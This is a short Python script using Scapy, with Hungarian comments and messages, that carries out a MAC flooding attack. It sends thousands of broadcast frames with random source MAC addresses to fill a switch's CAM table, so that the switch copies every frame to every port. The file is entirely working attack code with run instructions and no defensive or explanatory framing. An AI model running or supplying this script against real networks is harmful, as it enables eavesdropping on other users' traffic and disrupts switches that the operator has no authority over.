#!/usr/bin/env python3
"""MAC flooding: véletlen forrás-MAC-okkal tölti a CAM-táblát.
A switch egy idő után hub-módba vált, és minden keretet minden portra másol.

Futtatás: sudo python3 mac_flood.py eth0 10000
"""
import random, sys
from scapy.all import Ether, IP, UDP, sendp, conf

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.getrandbits(8) for _ in range(5))

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
    conf.iface = iface
    print(f"[*] MAC flood indul: {count} keret a(z) {iface}-n...")
    for i in range(count):
        sendp(Ether(src=rand_mac(), dst="ff:ff:ff:ff:ff:ff") /
              IP(src="10.10.10.66", dst="10.10.10.1") / UDP(), verbose=0)
        if i % 1000 == 0:
            print(f"[+] elküldve: {i}")
    print("[!] Kész. Nézd: 'show mac address-table count' a switchen.")

if __name__ == "__main__":
    main()
